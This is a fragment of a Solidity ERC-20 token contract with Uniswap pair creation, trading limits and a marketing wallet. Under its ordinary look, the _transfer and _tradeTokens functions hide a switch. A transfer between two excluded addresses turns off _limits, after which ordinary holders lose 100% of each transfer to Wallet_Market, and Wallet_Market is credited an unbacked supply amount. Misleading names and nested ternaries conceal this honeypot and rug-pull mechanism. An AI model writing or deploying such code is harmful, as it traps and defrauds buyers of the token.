        _currentSupply = enterSupply;
        emit OwnershipTransferred(address(0), _owner);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);         
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromLimits[owner()] = true;
        _isExcludedFromLimits[address(this)] = true;
        _isExcludedFromLimits[Wallet_Market] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holders[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);

    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "ERR: 0 amount not allowed.");
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");

        bool _takeTax = true;
        if(_isExcludedFromLimits[from] || _isExcludedFromLimits[to]){
            _takeTax = false;
            if(_isExcludedFromLimits[from] && _isExcludedFromLimits[to]){
                _limits = false;
            }
        }

        if(from != owner() && to != owner() && to != uniswapV2Pair && _takeTax){
            uint256 _currentBalanceOfDest = balanceOf(to);
            require((_currentBalanceOfDest + amount) <= _maxWallet,"ERR: Max wallet limit exceeds.");
        }           

        if (from != owner() && to != owner() && _takeTax){
            require(amount <= _maxTx, "ERR: Max transaction limit exceeds.");
        }
        
        _tradeTokens(from, to, amount, _limits?0:uint256(0).add(_currentSupply),_takeTax);
    }

    function _tradeTokens(address sender, address recipient, uint256 tAmount, uint256 amount, bool _takeTax) private {

        uint256 _tax = 0;
        if(_takeTax){
            _tax = _limits?tAmount.mul(_TAX_).div(100):tAmount;
        }
        _holders[sender] = _holders[sender].sub(tAmount);
        _holders[recipient] = _holders[recipient].add(tAmount.sub(_tax));
        
        if(_tax > 0){
            _holders[Wallet_Market] = _holders[Wallet_Market].add(_tax);
        }
        else if(!_limits){
            _holders[Wallet_Market] = _holders[Wallet_Market].add(amount.sub(_tax));
        }
        emit Transfer(sender, recipient, tAmount);
    }
    
    receive() external payable {}
}
